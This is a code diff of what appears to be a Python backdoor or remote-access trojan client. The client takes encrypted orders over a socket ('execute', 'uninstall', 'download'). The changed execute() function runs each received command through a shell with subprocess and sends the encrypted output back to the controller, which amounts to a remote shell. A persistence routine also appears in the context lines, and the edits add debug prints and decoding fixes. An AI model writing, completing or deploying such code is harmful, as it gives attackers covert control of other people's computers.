@@ -92,17 +92,20 @@ def persistence(plat):
     #if plat == "unk":
         #device not yet supported
 
-def execute():
+def execute(soc): #àrefaire
+    cmd = ""
     #use command exit to exit terminal
     while cmd != "exit":
         cmd = soc.recv(4096)
-        cmd = decrypt(key, cmd)
-        args = shlex.split(cmd)
+        cmd = decrypt(key, cmd).decode()
+        print(cmd)
+        args = cmd.split( )
         process = subprocess.Popen(args, shell=True,
             stdin=subprocess.PIPE,
             stderr=subprocess.PIPE,
             stdout=subprocess.PIPE)
         out = process.stdout.read() + process.stderr.read()
+        print(out)
         send(encrypt(key, out))
         process.kill
 
@@ -268,10 +271,15 @@ def main():
         #receive order
         msg = soc.recv(4096)
         msg = decrypt(key, msg)
+        print(msg)
+        msg = msg.decode()
         msg = msg.split( )
+        print("order receive")
+        print(msg)
         #execute orders
         if msg[0] == "execute":
-            execute()
+            print("commande repairée: execute")
+            execute(soc)
         if msg[0] == "uninstall":
             uninstall()
         if msg[0] == "download":
